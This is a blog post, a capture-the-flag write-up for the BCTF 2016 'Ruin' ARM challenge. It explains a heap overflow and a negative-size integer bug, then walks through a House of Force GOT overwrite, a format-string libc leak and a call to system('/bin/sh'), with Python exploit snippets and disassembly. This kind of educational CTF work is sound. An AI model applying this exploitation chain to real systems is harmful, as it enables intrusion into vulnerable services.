<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content=" BCTF 2016 - Ruin" prefix="og: http://ogp.me/ns#" property=og:title><meta content=" BCTF 2016 - Ruin - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-03-22-bctf-16-ruin property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content=" BCTF 2016 - Ruin - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-03-22-bctf-16-ruin name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-03-22-bctf-16-ruin",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description":  BCTF 2016 - Ruin - by hugsy",
      
    }
    </script><title>
   BCTF 2016 - Ruin
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>BCTF 2016 - Ruin</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 21 March 2016 <br> <br> <i>Reading time: 9 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>This is an ARM 32b exploitation challenge part of the <a rel="noopener nofollow noreferrer" href=https://ctftime.org/ctf/94 target=_blank>BCTF</a> competition, which I’ve enjoyed playing with the team TheGoonies. During the competition, only 18 teams (out of the 500+) were able to solve it. All props to them!<p>The technique I used to solve it is a bit twisted but it works fine and reliably. So hang on ☺<h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ruin.7b694dc96bf316a40ff7163479850f78
</span><span style=color:#bf616a>ruin.7b694dc96bf316a40ff7163479850f78:</span><span> ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.26, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=072b955ca434ca0c1df6507144d4a2c4cdc9078e, stripped
</span><span style=color:#bf616a>gef➤</span><span>  checksec ruin.7b694dc96bf316a40ff7163479850f78
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>ruin.7b694dc96bf316a40ff7163479850f78</span><span>'
</span><span style=color:#bf616a>Canary:</span><span>                                           Yes
</span><span style=color:#bf616a>NX</span><span> Support:                                       Yes
</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
</span><span style=color:#bf616a>RPATH:</span><span>                                            No
</span><span style=color:#bf616a>RUNPATH:</span><span>                                          No
</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    No
</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
</span></code></pre><p>Since the target is an ARM binary, I heavily relied on the tool I wrote, <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef target=_blank>GDB-GEF</a> to help me in the exploitation process.<h3 id=vulnerability>Vulnerability</h3><p><code>ruin</code> is an ARM ELF binary that allows you to store “securely” messages in memory, acting like a safe.<p>The real <code>main()</code> function starts at 0x00008A88 and starts by allocating on the heap (<code>malloc()</code>) an 8-byte chunk, then jump to a function at 0x89CC (which I’ve called <code>get_key_security</code>) to authenticate and unlock the safe. <a href=https://i.imgur.com/WhZ5QLW.png target=_blank> <img alt=get-key-security src=https://i.imgur.com/WhZ5QLW.png title=get-key-security width=100%> </a><p>The <code>strncmp()</code> call trivially shows the expected initial key, in this case <code>security</code>. Once the safe is unlocked, 4 different operations are possible:<ol><li>Update the key (function @0x000087D0, which I will call <code>update_key()</code> in the rest of this write-up): this function will allocate a 16-byte <code>key</code> chunk, and copy the content from stdin.<li>Edit a secret stored (function @0x0000884C, which I will call <code>edit_secret()</code>): if the <code>secret</code> chunk is not allocated, then the function invokes <code>malloc(8)</code>. Then it performs an <code>fgets()</code> to store 24 bytes from stdin (us!) into this buffer. We immediately spot a heap overflow here. <a href=https://i.imgur.com/sTpxqBT.png target=_blank> <img alt=heap-ovf src=https://i.imgur.com/sTpxqBT.png title=heap-ovf width=100%> </a><li>Sign the secret with your name (function @0x000088B8, <code>sign_name()</code>): if the <code>name</code> chunk is not NULL (i.e. already allocated), then the function returns. Otherwise, it calls the <code>read_int()</code> function at 0x0875C which prompts the user for the name size with <code>atoi()</code>, checks it’s higher than 0x20 bytes, if so, <code>malloc(size)</code> and reads its contents from stdin using <code>fgets()</code>.</ol><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:0000875C</span><span>        read_int                                ; </span><span style=color:#bf616a>CODE</span><span> XREF: sign_name+34
</span><span style=color:#bf616a>.text:0000875C</span><span> result          =</span><span style=color:#bf616a> -0x2C
</span><span style=color:#bf616a>.text:0000875C</span><span> buffer          =</span><span style=color:#bf616a> -0x28
</span><span style=color:#bf616a>.text:0000875C</span><span> canary          =</span><span style=color:#bf616a> -8
</span><span style=color:#bf616a>.text:0000875C
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>.text:00008774</span><span>                 LDR     R3, =stdin
</span><span style=color:#bf616a>.text:00008778</span><span>                 LDR     R3, </span><span style=color:#b48ead>[</span><span>R3</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>.text:0000877C</span><span>                 SUB     R2, R11, </span><span style=color:#65737e>#-buffer
</span><span style=color:#bf616a>.text:00008780</span><span>                 MOV     R0, R2          ; </span><span style=color:#bf616a>s
</span><span style=color:#bf616a>.text:00008784</span><span>                 MOV     R1, </span><span style=color:#65737e>#32         ; n
</span><span style=color:#bf616a>.text:00008788</span><span>                 MOV     R2, R3          ; </span><span style=color:#bf616a>stream
</span><span style=color:#bf616a>.text:0000878C</span><span>                 BL      fgets
</span><span style=color:#bf616a>.text:00008790</span><span>                 SUB     R3, R11, </span><span style=color:#65737e>#-buffer
</span><span style=color:#bf616a>.text:00008794</span><span>                 MOV     R0, R3          ; </span><span style=color:#bf616a>nptr
</span><span style=color:#bf616a>.text:00008798</span><span>                 BL      atoi
</span><span style=color:#bf616a>.text:0000879C</span><span>                 STR     R0, </span><span style=color:#b48ead>[</span><span>R11,#result</span><span style=color:#b48ead>]
</span></code></pre><ol><li>Leave (function @0x00008978, <code>leave()</code>): invokes <code>free()</code> to de-allocate the 3 buffers allocated by the steps above, and then exit cleanly.</ol><p>We have 2 vulnerabilities here:<ul><li>The heap overflow explained in the <code>edit_secret()</code> function<li>The integer overflow from the <code>sign_name()</code> function, since the <code>atoi()</code> call is not checked for negative integer before being compared. This allows us to control the size of the next <code>malloc()</code> call (the one used to store the name).</ul><h3 id=exploitation>Exploitation</h3><h4 id=the-house-of-force>The House of Force</h4><p>With those 2 vulnerabilities, and the fact that we can control another chunk to be allocated (through the <code>update_key()</code> function), we have now a perfect scenario for an <strong>“House of Force”</strong> heap exploitation. If you need a reminder, I recommend you read <a rel="noopener nofollow noreferrer" href=http://phrack.org/issues/66/10.html target=_blank>this</a> and <a rel="noopener nofollow noreferrer" href=https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/ target=_blank>this</a>.<p>The idea behind this attack (which still works against recent libc heap allocator), is to be able to control the size of one chunk. By making the value of the size for this new chunk very big, it will allow us to overflow the address space, and make the chunk upper bound finish in an “interesting” writable location, for example, the <a rel="noopener nofollow noreferrer" href=https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html target=_blank>Global Offset Table</a>.<p>When we reach the “main” loop, the <code>secret</code> chunk (8 bytes) is already allocated. So we can use the <code>malloc(name_size)</code> to create a chunk that will overflow the address space and end in the GOT, which starts at 0x00010F48.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>                    </span><span style=color:#bf616a>0xffffffff</span><span>   .            .
</span><span>                                 </span><span style=color:#96b5b4>.</span><span>            .
</span><span>                                 |     </span><span style=color:#bf616a>^      </span><span>|
</span><span>                                 |     |      |
</span><span>                                 |     |      |
</span><span>                                 |     |      |     </span><span style=color:#8fa1b3>malloc</span><span>() call for allocating the
</span><span>                                 |     |      |     name.
</span><span>                                 |            |
</span><span>                                 |            |
</span><span>                                 |   secret   |  &LT- Heap overflow: we can overwrite the
</span><span>                                 |            |     chunk)
</span><span>                                 |            |
</span><span>                                 .            .
</span><span>                                 .            .
</span><span>                                 |            |
</span><span>                                 | printf@got |
</span><span>                                 | exit@got   |
</span><span>                                 | puts@got   | &LT- Target we want overridden
</span><span>                                 | free@got   |    so we make malloc(</span><span style=color:#bf616a>name_length</span><span>)
</span><span>                                 |            |    </span><span style=color:#bf616a>header</span><span>)</span><span style=color:#96b5b4>.</span><span> The next malloc(key) </span><span style=color:#bf616a>will
</span><span>                                 |            |    </span><span style=color:#bf616a>overwrite</span><span> the GOT with controlled
</span><span>                                 |            |    </span><span style=color:#bf616a>data.
</span><span>                     </span><span style=color:#bf616a>0x00000000</span><span>  .            .
</span></code></pre><p>So what size do we need for the <em>name</em> chunk? We know that the <em>key</em> chunk can write 16 bytes, so 4 DWORD. And also, the target address must be aligned to 2 DWORD (8 bytes - because it is an ARM 32 bits).</p><a href=https://i.imgur.com/DQjJxu6.png target=_blank> <img alt=got src=https://i.imgur.com/DQjJxu6.png title=got width=100%> </a><h4 id=leaking-heap-memory>Leaking heap memory</h4><p>But we have a problem, we don’t know where the heap pages are located in the memory <code>fread()</code>, which unlike <code>fgets()</code> does not append a NULL byte at the end of the string.</p><a href=https://i.imgur.com/Wml7uwI.png target=_blank> <img alt=auth-func src=https://i.imgur.com/Wml7uwI.png title=auth-func width=100%> </a><p>This allows to leak addresses some precious bytes from the heap, doing something like this:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>auth</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>please input your 8-bit key:</span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>8</span><span>)
</span><span>    leak = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span><span>    leak = leak.</span><span style=color:#bf616a>replace</span><span>("</span><span style=color:#a3be8c> is wrong, try again!</span><span style=color:#96b5b4>\n</span><span>", '')
</span><span>    leak = leak.</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>A</span><span>'*</span><span style=color:#d08770>8</span><span>, '')
</span><span>    </span><span style=color:#b48ead>if </span><span style=color:#96b5b4>len</span><span>(leak)<</span><span style=color:#d08770>4</span><span>: leak += "</span><span style=color:#96b5b4>\x00</span><span>"*(</span><span style=color:#d08770>4</span><span>-</span><span style=color:#96b5b4>len</span><span>(leak))
</span><span>    leak = </span><span style=color:#bf616a>i_u</span><span>(leak)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>please input your 8-bit key:</span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>security</span><span>")
</span><span>    </span><span style=color:#b48ead>return </span><span>leak
</span></code></pre><h4 id=controlling-pc>Controlling $pc</h4><p>From the heap memory leak, we know the address of the <code>secret</code> chunk, which means that the <code>name</code> chunk headers will be located exactly 8 bytes after.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>     |  </span><span style=color:#bf616a>secret  </span><span>|  </span><span style=color:#bf616a>name     </span><span>|   | </span><span style=color:#bf616a>key      </span><span>|
</span></code></pre><p>So we must set the length for the <code>name</code> chunk dynamically by using the <code>update_key()</code> function:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#bf616a>ATOI_GOT   </span><span>= </span><span style=color:#d08770>0x00010F80 </span><span>- </span><span style=color:#d08770>2</span><span>*</span><span style=color:#d08770>8
</span><span>[</span><span style=color:#d08770>...</span><span>]
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>sign_name</span><span>(</span><span style=color:#bf616a>s</span><span>, </span><span style=color:#bf616a>addr</span><span>):
</span><span>    </span><span style=color:#bf616a>select_menu_entry</span><span>(s, </span><span style=color:#d08770>3</span><span>)
</span><span>    new_sz = -addr + </span><span style=color:#bf616a>ATOI_GOT
</span><span>    name = "</span><span style=color:#a3be8c>JUNK</span><span>"*</span><span style=color:#d08770>8
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>malloc(name) with size=</span><span style=color:#d08770>%#x</span><span>" % new_sz)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>please input your name length:</span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#d08770>%d</span><span style=color:#96b5b4>\n</span><span>" % new_sz)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>enter your name:</span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(name)
</span><span>    </span><span style=color:#b48ead>return
</span><span>
</span><span>secret_addr    = leak - </span><span style=color:#d08770>8
</span><span>name_addr      = secret_addr + </span><span style=color:#d08770>8 </span><span>+ </span><span style=color:#d08770>8
</span><span>
</span><span style=color:#bf616a>sign_name</span><span>(s, name_addr)
</span></code></pre><p>The heap is now set dynamically with the correct offset. The next call to <code>malloc()</code> will overwrite the GOT entry of <code>atoi@got</code> with our data!<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>update_key</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>malloc(key)</span><span>")
</span><span>    </span><span style=color:#bf616a>select_menu_entry</span><span>(s, </span><span style=color:#d08770>1</span><span>)
</span><span>    key = ""
</span><span>    key+= "</span><span style=color:#96b5b4>\xbb</span><span>"*</span><span style=color:#d08770>4              </span><span style=color:#65737e># atoi@got will be overwritten with this value
</span><span>    key+= "</span><span style=color:#a3be8c>B</span><span>"*</span><span style=color:#d08770>4 </span><span>+ "</span><span style=color:#a3be8c>C</span><span>"*</span><span style=color:#d08770>4 </span><span>+ "</span><span style=color:#a3be8c>D</span><span>"*</span><span style=color:#d08770>4
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>enter the new 16-bit key:</span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(key)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>the key is updated!</span><span>")
</span><span>    </span><span style=color:#b48ead>return
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>leave</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Leaving - and triggering atoi@got</span><span>")
</span><span>    </span><span style=color:#bf616a>select_menu_entry</span><span>(s, </span><span style=color:#d08770>4</span><span>)
</span><span>    </span><span style=color:#b48ead>return
</span></code></pre><p>Which produces the following result in <code>gef</code>: <a href=https://i.imgur.com/UdmAg6N.png target=_blank> <img alt=control-pc src=https://i.imgur.com/UdmAg6N.png title=control-pc width=100%> </a><p>Bingo! We control the execution flow! Good! But now where do we go?<p>The binary is dynamically linked, and does not contains any gadget that would allow us to call directly <code>execve</code> so we need a leak from the libc.<h4 id=using-function-indirection-to-leak-memory-using-printf>Using function indirection to leak memory using printf</h4><p>I’m not sure if this is the best way to do, but I like this approach: the idea is that, when you can overwrite the GOT, point an “interesting” function of the control flow to <code>printf@plt</code>. This way, if you can control the parameter of this call, you can use a regular format string attack to read/write everywhere!!<p>The <code>read_int()</code> (at 0x875c) offers a perfect exploitation case: <a href=https://i.imgur.com/81p3djs.png target=_blank> <img alt=read-int-ida src=https://i.imgur.com/81p3djs.png title=read-int-ida width=100%> </a><p><code>fgets</code> at 0x878c allows us to provide 32 bytes in the stack, which will be given to <code>atoi</code> as a parameter. So if we overwrite <code>atoi@got</code> with the address of <code>printf@plt</code>, we have a good case for a format string attack.<p>So using the technique above, we can overwrite <code>atoi@got</code> with the address of <code>printf</code> in the <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Dynamic_linker target=_blank>PLT</a>:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.plt:00008594 </span><span>; </span><span style=color:#bf616a>int</span><span> printf(const char *format, ...)
</span><span style=color:#bf616a>.plt:00008594</span><span> printf                                  ; </span><span style=color:#bf616a>CODE</span><span> XREF: print_banner+58
</span><span style=color:#bf616a>.plt:00008594                                         </span><span>; </span><span style=color:#bf616a>update_key+38</span><span> ...
</span><span style=color:#bf616a>.plt:00008594</span><span>                 ADR     R12, 0x859C
</span><span style=color:#bf616a>.plt:00008598</span><span>                 ADD     R12, R12, </span><span style=color:#65737e>#0x8000
</span><span style=color:#bf616a>.plt:0000859C</span><span>                 LDR     PC, </span><span style=color:#b48ead>[</span><span>R12,#(printf_ptr - 0x1059C)</span><span style=color:#b48ead>]</span><span>! ; </span><span style=color:#bf616a>__imp_printf
</span></code></pre><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#bf616a>update_key</span><span>(s, </span><span style=color:#bf616a>PRINTF_IMPORT</span><span>, </span><span style=color:#d08770>False</span><span>)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>atoi@got: </span><span style=color:#d08770>%#x</span><span style=color:#a3be8c> -> </span><span style=color:#d08770>%#x</span><span>" % (</span><span style=color:#bf616a>ATOI_GOT</span><span>, </span><span style=color:#bf616a>PRINTF_IMPORT</span><span>))
</span></code></pre><p>So now every time the control flow will hit the <code>atoi()</code> function, the <code>printf()</code> stub will be executed, and we will receive the argument from the socket! So every time the banner will prompt for a choice (1-4), the buffer we send will be the argument to <code>printf()</code>.<h4 id=triggering-the-exploit>Triggering the exploit</h4><p>By leaking the memory, we find that an address to the libc can be found (at least) at the offset 21: <a href=https://i.imgur.com/Q5UpCbc.png target=_blank> <img alt=libc-leak src=https://i.imgur.com/Q5UpCbc.png title=libc-leak width=100%> </a><p>On the C library I tested, the <code>system()</code> function was located at an offset of 0x37524 from the base. So now, we know the address of <code>system()</code>:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#b48ead>while </span><span style=color:#d08770>True</span><span>:
</span><span>        s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>data> %21$#.8x</span><span style=color:#96b5b4>\n</span><span>")
</span><span>        leak = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span><span>        </span><span style=color:#b48ead>if </span><span>"</span><span style=color:#a3be8c>data> </span><span>" in leak:
</span><span>            </span><span style=color:#b48ead>break
</span><span>
</span><span>    libc_leak = </span><span style=color:#bf616a>int</span><span>(leak.</span><span style=color:#bf616a>strip</span><span>().</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>], </span><span style=color:#d08770>16</span><span>)
</span><span>    libc_base = libc_leak - </span><span style=color:#d08770>0x16d24
</span><span>    libc_system = libc_base + </span><span style=color:#d08770>0x37524
</span><span>
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got libc_leak: </span><span style=color:#d08770>%#x</span><span>" % libc_leak)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got libc_base: </span><span style=color:#d08770>%#x</span><span>" % libc_base)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got libc_system: </span><span style=color:#d08770>%#x</span><span>" % libc_system)
</span></code></pre><p>And to complete the exploitation, all we must do is overwrite again <code>atoi@got</code> with the address of <code>system()</code>, and when <code>fgets()</code> will be triggered, simply enter the command we want to execute, in this case <code>/bin/sh</code> will do:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#bf616a>update_key</span><span>(s, libc_system, </span><span style=color:#d08770>True</span><span>)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>atoi@got: </span><span style=color:#d08770>%#x</span><span style=color:#a3be8c> -> </span><span style=color:#d08770>%#x</span><span>" % (</span><span style=color:#bf616a>ATOI_GOT</span><span>, libc_system))
</span><span>
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>/bin/sh</span><span>"+'</span><span style=color:#96b5b4>\x00</span><span>'*</span><span style=color:#d08770>10</span><span>)
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><p>The exploit is complete, we can run it: <a href=https://i.imgur.com/Ei1aeLb.png target=_blank> <img alt=image_alt src=https://i.imgur.com/Ei1aeLb.png title=image_alt width=100%> </a><p>And as always, go <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/187f7dd80cb5bff20842 target=_blank>here</a> for the full exploit.<p>Peace out ✌<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/gef/>#gef</a> <a href=https://blahcat.github.io/tags/bctf-2016/>#bctf-2016</a> <a href=https://blahcat.github.io/tags/arm/>#arm</a> <a href=https://blahcat.github.io/tags/heap-overflow/>#heap-overflow</a> <a href=https://blahcat.github.io/tags/format-string/>#format-string</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q= BCTF 2016 - Ruin" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-03-28-volgactf-2016-web-of-science/> <section class=post-nav-teaser><b class=post-nav-title>VolgaCTF 2016 - Web of Science</b><p class=post-nav-excerpt>Info gef➤ !file ./web_of_science ./web_of_science: ELF 64-bit LSB executab…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-03-14-0ctf-2016-warmup-write-up/> <section class=post-nav-teaser><b class=post-nav-title>0ctf 2016 - Warmup write-up</b><p class=post-nav-excerpt>I participated to 0ctf but only had time to play for the reversing challeng…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>